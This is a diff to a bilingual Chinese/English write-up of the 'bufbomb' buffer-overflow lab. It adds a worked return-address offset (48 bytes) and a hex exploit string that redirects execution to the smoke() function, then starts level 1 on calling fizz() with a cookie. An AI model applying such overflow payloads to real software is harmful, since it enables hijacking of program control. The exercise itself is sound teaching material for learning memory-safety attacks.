@@ -2,7 +2,7 @@
 
 实验整体思路为，在给定的32位程序-bufbomb输入溢出内容，达到改变程序原有执行顺序。
 
-网上也有相同内容，但反汇编结果不同。
+网上也有相同内容，但反汇编结果不同。我们用bufbomb来做实验，bufbomb on the internet 可以用来做参考。
 
 ## level 0
 首先通过 `objdump -d bufbomb > buf_asm` 导出bufbomb反汇编文件。
@@ -30,7 +30,7 @@ The disassembly result of our bufbomb.
  8048ed9:   89 04 24                mov    %eax,(%esp)
 ```
 There is no **ebp** register in this disassembly program，估计哪位改了改。    
-Let's go! **esp** sub *0x3c*，**eax** point to **esp** plus *0x10*，    
+Let's go! **esp** sub *0x3c*，**eax** point to **esp** plus *0x10* equal to *0x2c*，    
 So the distance form **eax** to ret is：    
 
 >44bytes + ret address = 44 + 4 = 48bytes
@@ -39,11 +39,34 @@ We get the same result 48.
 
 Finally, according to your own situation，turn the adress to the address of _somke()_ function： `08048ccc <smoke>:`
 
+```
+00 00 00 00    
+00 00 00 00    
+00 00 00 00    
+00 00 00 00    
+00 00 00 00    
+00 00 00 00    
+00 00 00 00    
+00 00 00 00    
+00 00 00 00    
+00 00 00 00    
+00 00 00 00    
+cc 8c 04 08
+```
+
 > Userid: hanggi    
-> Cookie: 0x11c1be21    
-> Type string:Smoke!: You called smoke()    
-VAILD
+ Cookie: 0x11c1be21    
+ Type string:Smoke!: You called smoke()    
+ VAILD    
 > NICE JOB!
+
+
+## level 1
+在这个level，我们的任务是调用 *fizz()* 函数。但是fizz需要一个参数，当这个参数等于你的cookie时，才能通过升级。
+
+Let's use the following command.
+`$ ./makecookie hanggi`
+I got the value of 0x11c1be21.
 
 
 ## title
